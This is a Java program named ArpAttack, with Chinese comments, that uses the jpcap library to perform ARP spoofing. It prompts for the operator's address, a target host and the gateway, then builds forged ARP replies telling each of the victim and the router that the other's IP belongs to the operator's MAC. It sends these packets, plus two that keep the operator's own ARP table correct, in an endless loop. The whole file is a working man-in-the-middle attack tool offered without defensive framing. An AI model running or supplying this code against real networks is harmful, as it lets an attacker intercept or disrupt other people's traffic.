import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;
import java.util.Scanner;

public class ArpAttack {
    public static void main(String[] args) throws Exception{
        int time = 1;  // 重发间隔时间

        Scanner scanner = new Scanner(System.in);

        /*
         为了省事，本地IP，Mac地址需手动输入
         */
        System.out.print("本机IP地址：");
        InetAddress myIp = InetAddress.getByName(scanner.next());
        System.out.print("本机Mac地址：");
        byte[] myMac = macToBytes(scanner.next());

        // 目标主机的IP与Mac
        System.out.print("目标IP地址：");
        InetAddress targetIp = InetAddress.getByName(scanner.next());
        byte[] targetMac = macToBytes(NetUtil.getMacAddress(targetIp.getHostAddress()));

        // 网关的IP与Mac
        System.out.print("网关IP地址：");
        InetAddress wanIp = InetAddress.getByName(scanner.next());
        byte[] wanMac = macToBytes(NetUtil.getMacAddress(wanIp.getHostName()));

        System.out.println("\n-------------------------------------------------\n");

        // 枚举网卡并打开设备
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length;i++) {
            System.out.printf("%s.%s,Mac=[%s]%n",i,
                    devices[i].description, macToStr(devices[i].mac_address));
        }
        System.out.print("\n选择一个网卡：");
        NetworkInterface device = devices[scanner.nextInt()];

        System.out.println("\n-------------------------------------------------\n");

        JpcapSender sender = JpcapSender.openDevice(device);

        // 告诉靶机: 我是路由器，实则填写的却是本机的Mac地址
        ARPPacket arp1 = getARPPacket(myMac,wanIp,targetMac,targetIp);
        // 告诉路由器: 我是靶机，实则填写的是本机的Mac地址
        ARPPacket arp2 = getARPPacket(myMac,targetIp,wanMac,wanIp);
        // 在欺骗目标的同时，自己的主机ARP表也会被破坏，导致访问不到路由器
        // 所以下面两个包是告诉本机正确的IP地址对应的Mac地址
        ARPPacket arp3 = getARPPacket(wanMac,wanIp,myMac,myIp);
        ARPPacket arp4 = getARPPacket(targetMac,targetIp,myMac,myIp);

        // 发送ARP应答包
        for (int i = 1;true;i++) {
            sender.sendPacket(arp1);
            sender.sendPacket(arp2);
            sender.sendPacket(arp3);
            sender.sendPacket(arp4);

            System.out.println("已发送： " + i);
            Thread.sleep(time * 1000);
        }
    }

    /**
     * mac地址转byte数组的方法
     */
    public static byte[] macToBytes(String s) {
        byte[] bytes = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
        String[] s1 = s.split("-");
        for (int i = 0; i < s1.length; i++) {
            bytes[i] = (byte) ((Integer.parseInt(s1[i], 16)) & 0xff);
        }
        return bytes;
    }

    /**
     * mac字节转字符串的方法
     */
    public static String macToStr(byte[] bytes) {
        StringBuilder str = new StringBuilder();
        for (int i = 0; i < bytes.length; i++) {
            str.append(Integer.toString(bytes[i] & 0xff, 16));
            if (i < bytes.length - 1) {
                str.append("-");
            }
        }
        return str.toString();
    }

    /**
     * 构造ARP包的方法
     */
    public static ARPPacket getARPPacket(byte[] sender_hardaddr, InetAddress sender_protoaddr,
                                         byte[] target_hardaddr, InetAddress target_protoaddr) {

        ARPPacket arp = new ARPPacket();

        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = sender_hardaddr;
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        arp.target_hardaddr = target_hardaddr;
        arp.target_protoaddr = target_protoaddr.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = sender_hardaddr;
        ether.dst_mac = target_hardaddr;
        arp.datalink = ether;

        return arp;
    }
}

